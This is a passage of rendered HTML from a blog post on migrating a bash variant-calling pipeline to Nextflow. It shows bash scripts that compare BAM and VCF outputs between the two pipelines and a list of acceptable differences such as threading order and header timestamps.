style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  First 10 reads comparison:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  --- Baseline ---"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools view </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-10</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  --- Migrated ---"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    samtools view </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-10</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 3. For VCF files: compare variants</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$FILENAME</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> *.vcf </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"VCF file analysis:"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Count variants (skip header)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">BASELINE_VARS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">MIGRATED_VARS</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$(</span><span class="token variable function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token variable string" style="color:hsl(119, 34%, 47%)">"</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable function" style="color:hsl(221, 87%, 60%)">wc</span><span class="token variable" style="color:hsl(221, 87%, 60%)"> </span><span class="token variable parameter variable" style="color:hsl(221, 87%, 60%)">-l</span><span class="token variable" style="color:hsl(221, 87%, 60%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Baseline variants: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_VARS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Migrated variants: </span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_VARS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE_VARS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">!=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED_VARS</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  Variant count mismatch!"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Show first differences</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"  First 5 variants (baseline vs migrated):"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> -5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> -5</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># 4. Compare line-by-line for text files</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">if</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$FILENAME</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> *.vcf </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$FILENAME</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> *.txt </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">then</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">echo</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"Line-by-line diff (first 20 differences):"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$BASELINE</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$MIGRATED</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">head</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-20</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">||</span><span class="token plain"> </span><span class="token boolean" style="color:hsl(35, 99%, 36%)">true</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">fi</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="34-handle-expected-differences">3.4 Handle Expected Differences<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#34-handle-expected-differences" class="hash-link" aria-label="Direct link to 3.4 Handle Expected Differences" title="Direct link to 3.4 Handle Expected Differences" translate="no">​</a></h3>
<p>Some differences are acceptable. Document them:</p>
<div class="language-markdown codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-markdown codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">#</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> Known Acceptable Differences Between Bash and Nextflow</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> 1. Tool Versions</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Bash: bwa 0.7.17, samtools 1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Nextflow: bwa 0.7.17, samtools 1.18</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">→ If versions match, output should be identical</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> 2. Threading Order (BAM files)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Threading can affect read order in BAM files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Solution: Use </span><span class="token code-snippet code keyword" style="color:hsl(301, 63%, 40%)">`samtools sort`</span><span class="token plain"> or deterministic sort</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Verification: Extract and compare SAM headers + sort order</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token title important punctuation" style="color:hsl(119, 34%, 47%);font-weight:bold">##</span><span class="token title important" style="color:hsl(230, 8%, 24%);font-weight:bold"> 3. VCF Header Timestamps</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> VCF files may have different generation timestamps</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token list punctuation" style="color:hsl(119, 34%, 47%)">-</span><span class="token plain"> Solution: Strip headers before comparison</span><br></span></code></pre></div></div>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare VCF ignoring header differences</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function-name function" style="color:hsl(221, 87%, 60%)">compare_vcf_body</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">baseline</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">migrated</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^##"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#CHROM"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^##"</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">grep</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"^#CHROM"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Compare BAM files by extracting SAM</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function-name function" style="color:hsl(221, 87%, 60%)">compare_bam_content</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">baseline</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$1</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">local</span><span class="token plain"> </span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">migrated</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token variable" style="color:hsl(221, 87%, 60%)">$2</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token function" style="color:hsl(221, 87%, 60%)">diff</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samtools view </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$baseline</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> -k1,1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">\</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token operator" style="color:hsl(221, 87%, 60%)">&lt;</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">samtools view </span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token string variable" style="color:hsl(221, 87%, 60%)">$migrated</span><span class="token string" style="color:hsl(119, 34%, 47%)">"</span><span class="token plain"> </span><span class="token operator" style="color:hsl(221, 87%, 60%)">|</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">sort</span><span class="token plain"> -k1,1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">}</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="practical-example-full-migration-walkthrough">Practical Example: Full Migration Walkthrough<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#practical-example-full-migration-walkthrough" class="hash-link" aria-label="Direct link to Practical Example: Full Migration Walkthrough" title="Direct link to Practical Example: Full Migration Walkthrough" translate="no">​</a></h2>
<p>Let's follow a complete migration scenario:</p>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="original-bash-pipeline">Original Bash Pipeline<a href="https://riverxdata.github.io/river-docs/blog/migrate-bash-nextflow-enterprise-pipeline#original-bash-pipeline" class="hash-link" aria-label="Direct link to Original Bash Pipeline" title="Direct link to Original Bash Pipeline" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token shebang important" style="color:hsl(230, 8%, 24%);font-weight:bold">#!/bin/bash</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># variant_calling_pipeline.sh</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">set</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-euo</span><span class="token plain"> pipefail</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token assign-left variable" style="color:hsl(221, 87%, 60%)">SAMPLE</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"sample_001"</span><span class="token plain"></span><br></span><span 